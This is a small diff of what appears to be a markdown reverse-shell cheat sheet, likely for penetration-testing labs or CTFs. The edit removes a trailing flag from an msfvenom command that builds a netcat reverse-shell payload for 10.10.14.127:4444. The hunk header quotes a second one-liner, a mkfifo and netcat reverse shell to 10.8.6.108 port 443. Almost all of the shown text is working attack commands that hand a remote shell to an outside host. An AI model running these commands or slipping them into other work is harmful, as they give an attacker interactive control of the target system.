@@ -13,7 +13,7 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.8.6.108 443 >/tmp/f
 ### NC - MSFVenom
 
 ```bash
-sudo msfvenom -p cmd/unix/reverse_netcat lhost=10.10.14.127 lport=4444 R
+sudo msfvenom -p cmd/unix/reverse_netcat lhost=10.10.14.127 lport=4444
 ```
 ### Python:
 
